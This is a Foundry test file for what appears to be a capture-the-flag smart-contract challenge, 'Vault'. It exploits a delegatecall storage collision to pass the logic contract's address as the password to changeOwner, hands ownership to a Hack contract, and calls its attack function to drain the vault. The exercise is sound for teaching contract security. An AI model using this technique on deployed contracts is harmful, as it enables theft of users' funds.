// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;
    Hack public hack;

    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));
        hack = new Hack(address(vault));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();

    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);
        address(vault).call(abi.encodeWithSignature("changeOwner(bytes32,address)", bytes32(uint256(uint160(address(logic)))), address(hack)));
        hack.attack{value : 0.01 ether}();
        // add your hacker code.

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }

}
